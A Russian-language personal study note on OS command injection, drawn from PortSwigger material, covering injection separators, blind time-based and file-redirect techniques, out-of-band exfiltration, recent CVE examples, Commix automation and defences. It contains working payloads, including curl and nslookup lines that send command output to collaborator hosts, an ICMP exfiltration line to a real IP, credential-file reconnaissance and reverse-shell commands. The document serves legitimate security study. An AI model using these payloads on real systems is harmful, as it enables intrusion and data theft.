
база по ОПЕР СИСТЕМАМ
---------------------------------------------------------------------------------
# [[🐧_linux_arch]]
# [[POINT-RECON]]
# [[🖼️_windows_arch]]
# [[OS_command]]

---------

## ФУНДАМЕНТАЛЬНЫЙ МЕХАНИЗМ (In-band)

**Как это работает по статье PortSwigger:**  
Если приложение берет пользовательский ввод (productID) и вставляет его **напрямую** в команду shell без валидации.  
`stockreport.pl [productID] [storeID]`  
Атакующий вводит: `& echo hello & ` просто выведет хелло в терминале
& в конце - значит выполнить быстро в фоне


**Почему это работает:**  
Символ `&` является разделителем команд. Shell интерпретирует это как:

1. Выполни `stockreport.pl`  (осн комманда от сайта например)
    
2. Выполни `echo hello`
    
3. Выполни `29`
    

**Payloads (Классика):**

- `& whoami &`    **`whoami` просто выводит имя текущего пользователя.**
Если `root` — ты бог, система твоя.  
Если `www-data` — ты нищеброд, начинай искать как повысить права.  
Если `john` — ты обычный юзер, смотри `sudo -l`.
[**Если `john` — ты просто какой-то Ваня.**
[Ни админ, ни веб-сервер, ни системный демон. Просто **Ваня**, который зачем-то сидит на этом сервере.

чтобы глянуть че ваня может - 

`sudo -l` Если выдаст: 
User john may run the following commands:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
    **ваня нихера не простой**. Ване просто пароль ввести лень, он может стать root

но если выдаст: User john is not allowed to run sudo
— **Ваня лох**. Пароль не знает, sudo не пускают.

но можно посмотреть где ваня находится 
```bash
pwd
ls -la
```
что рядом с Ваней
```bash
cat /etc/passwd | grep bash
```
Кто ещё есть на системе?
```bash
ps aux | grep john
```
Смотри что Ваня хранит
```bash
ls -la ~
cat ~/.bash_history
```



- `| whoami` (Вывод stdout первой команды во вторую)
    
- `|| whoami` (Выполни только если первая команда упала)
    
- `; whoami` (Unix only)
    
- `\n` (Перевод строки, Unix only)
    

---

## 2. БАЗОВЫЕ КОМАНДЫ РАЗВЕДКИ (Fingerprinting)

|Цель|Linux Payload|Windows Payload|
|---|---|---|
|**Текущий пользователь**|`whoami`|`whoami`|
|**ОС / Версия**|`uname -a`|`ver`|
|**Сеть (IP)**|`ifconfig`|`ipconfig /all`|
|**Сеть (Соединения)**|`netstat -an`|`netstat -an`|
|**Процессы**|`ps -ef`|`tasklist`|
|**Текущая директория**|`pwd`|`cd`|

---

## 3. ТИП 1: BLIND / АСИНХРОННЫЕ ИНЬЕКЦИИ

**Проблема:** Вывод команды **не возвращается** в HTTP-ответе. Вы не видите результат `whoami`.

### ▎3.1. Детект через Time-based

**Как работает:** Заставляем сервер "уснуть".  
**Почему работает:** Если уязвимость есть — HTTP-ответ придет через N секунд.

**Payloads (PortSwigger):**

- `& ping -c 10 127.0.0.1 &`
    
- **Актуальный 2026:** `& timeout 5 &` (BusyBox/Embedded) / `& ping -n 10 127.0.0.1 &`(Windows)
    

---

### ▎3.2. Эксплуатация Blind через Redirect (File Write)

**Как работает:** Перенаправляем вывод команды в файл в веб-директории.  
**Почему работает:** Мы можем скачать файл через браузер, если угадали путь.

**Payloads (PortSwigger + Real World):**

- `& whoami > /var/www/static/whoami.txt &`
    
- `& dir > C:\inetpub\wwwroot\output.txt &`
    
- **Актуальный (Node.js):** `& $(whoami) > /public/debug.log &` [ccылка](https://vulnerability.circl.lu/vuln/ghsa-q284-4pvr-m585)
    

---

### ▎3.3. Эксплуатация через OAST (Out-of-band)

**Как работает:** Заставляем сервер сходить на наш коллаборатор (DNS/HTTP). (https://app.interactsh.com)  
**Почему работает:** Даже если вывод скрыт, DNS-запрос мы увидим.

**Payloads (Классика):**

- `& nslookup [коллаборатор].burpcollaborator.net &`
    
- `& curl http://[коллаборатор].burpcollaborator.net &`
    

==**👉 ЭКСФИЛЬТРАЦИЯ ДАННЫХ (Главная техника 2026):**

- **DNS:** `& nslookup \`whoami`.[коллаборатор].[burpcollaborator.net](https://burpcollaborator.net/) &` [](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/command-injection/exfiltrate-data)
    
- **HTTP:** `& curl http://[коллаборатор].burpcollaborator.net/$(whoami) &`
    
- **ICMP (FortiSIEM CVE-2025-64155):** Атакующие использовали `ping -c 1 [IP]` с большим размером пакета для эксфильтрации хоста [](https://www.pwndefend.com/2026/01/16/fortisiem-cve-2025-64155-exploitation-analysis/).
    
    - `& cat /etc/hostname | xxd -p | ping -p $(cat) 154.192.222.43 &`
        

---

## 4. ТИП 2: ИНЬЕКЦИЯ ВНУТРИ КАВЫЧЕК (Quoted Context)

**Проблема (PortSwigger):** Ваш ввод находится внутри кавычек: `mail -F "[email_пользователя]"`.  
**Решение:** Закрыть кавычку перед инъекцией.

**Payload:**

- `" & whoami & "`
    
- `' & whoami & '`
    

---

## 5. ТИП 3: АСИНХРОННЫЕ ИНЬЕКЦИИ (PortSwigger Burp)

**Особенность:** Команда выполняется **не в момент запроса**, а позже (например, по крону, фоновым процессом). Ответ сервера не меняется вообще.  
**Техника:** Только OAST. Burp Collaborator постоянно опрашивается на предмет "пингов" [](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/command-injection/asynchronous).

---

## 6. АКТУАЛЬНЫЕ РЕАЛЬНЫЕ УЯЗВИМОСТИ (Кейсы 2026)

_Ниже — примеры из поиска, подтверждающие теорию PortSwigger живыми эксплойтами._

### 🔥 КЕЙС A: CVE-2026-2061 — D-Link DIR-823X

**Вектор:** Форма `/goform/set_ipv6`.  
**Суть:** Стандартная инъекция без авторизации.  
**Payload (из эксплойта):** Не указан публично, но техника — `& command &`.  
**Вывод:** До сих пор валидно на IoT [](https://vuldb.com/?id.344621).

### 🔥 КЕЙС B: CVE-2025-64756 — Red Hat Developer Hub

**Вектор:** Имена файлов.  
**Суть:** Неправильная валидация имени файла при обработке команд ОС.  
**Payload Гипотетический:** `filename=test; whoami; .txt` [](https://www.cybersecurity-help.cz/vdb/SB2026011926).

### 🔥 КЕЙС C: Deno Runtime (CVE-2026-22864) 

**Суть:** Разработчики запретили запуск `.bat` и `.cmd`. Защита была регистрозависимой.  
**Обход (Bypass):** Использование `.BAT` или `.Bat` вместо `.bat`.  
**Payload (PoC):**
```javascript
const command = new Deno.Command('./test.BAT', {
  args: ['& calc.exe'], // Калькулятор выполнится!
});
```

**Вывод:** Никогда не доверяйте регистру в блок-листах. В 2026 это все еще ломает системы [](https://dependabot.ecosyste.ms/advisories/CVE-2026-22864).

### 🔥 КЕЙС D: SignalK Server (CVE-2025-66398) — ДВУХЭТАПКА

**Вектор:** Глобальная переменная `restoreFilePath` + инъекция в npm.  
**Payload (RCE):** `1.0.0 & echo RCE_SUCCESS > rce_proof.txt &` [](https://secalerts.co/vulnerability/GHSA-w3x5-7c4c-66p9).  
**Сложность:** Сначала нужно было "отравить" состояние через `/validateBackup`.  
**Вывод:** Командная инъекция часто идет **вторым этапом** после другой уязвимости.

---

## 7. АВТОМАТИЗАЦИЯ (Commix — Standart 2026)

PortSwagger учит делать руками. В реальности пентестеры используют **Commix** [](https://www.redsecuretech.co.uk/blog/post/commix-practical-command-injection-exploitation-guide/852).

**Как работает:**

1. Детектит типы: `;`, `&`, `|`, `%0a`, `$(...)`.
    
2. Фингерпринтинг ОС.  разные команды и смотрим отпечатки собирая инфу о системе
    
3. Автоматически ставит псевдо-терминал.
    

**Примеры команд (Real World 2026):**


```bash
# Базовая проверка параметра
python3 commix.py -u "http://target.com/ping.php?ip=127.0.0.1"

# POST запрос с уровнем агрессии 3
python3 commix.py --url="http://target.com/submit.php" --data="name=test&cmd=ping" --level=3

# Получение реверс-шела (автоматически)
# В шелле commix: reverse_tcp 192.168.1.10 4444
```

---

## 8. ТАБЛИЦА: ВСЕ МЕТОДЫ ИНЪЕКЦИЙ (Шпаргалка)

|Метод|Пример|ОС|Слепой (Blind)|Звонкий (Verbose)|
|---|---|---|---|---|
|**Амперсанд**|`& whoami &`|Все|✅|✅|
|**Конвеер**|`\| whoami`|Все|✅|✅|
|**Логическое И**|`&& whoami`|Все|✅|✅|
|**Новая строка**|`%0awhoami%0a`|Unix|✅|✅|
|**Бектики**|`` `whoami` ``|Unix|✅ (если вывод куда-то идет)|❌|
|**Подстановка**|`$(whoami)`|Unix|✅ (если вывод куда-то идет)|❌|
|**Закрытие кавычек**|`" \| whoami`|Все|✅|✅|

---

## 9. ГЛАВНЫЙ ВЫВОД (Противодействие)

**Цитата PortSwigger:** _"Никогда не пытайтесь экранировать метасимволы — это бесполезно"._  
**Подтверждено 2026:**

1. **Deno** пытался экранировать расширения → обошли регистром [](https://dependabot.ecosyste.ms/advisories/CVE-2026-22864).
    
2. **SignalK** пытался валидировать, но оставил глобальную переменную [](https://secalerts.co/vulnerability/GHSA-w3x5-7c4c-66p9).
    
3. **FortiSIEM** — просто не было валидации на входе [](https://www.pwndefend.com/2026/01/16/fortisiem-cve-2025-64155-exploitation-analysis/).
    

**Только Whitelist.** Только вызов API без shell (`shell=False`, `execFile`, `escapeshellarg` с умом, но лучше замена архитектуры).

---




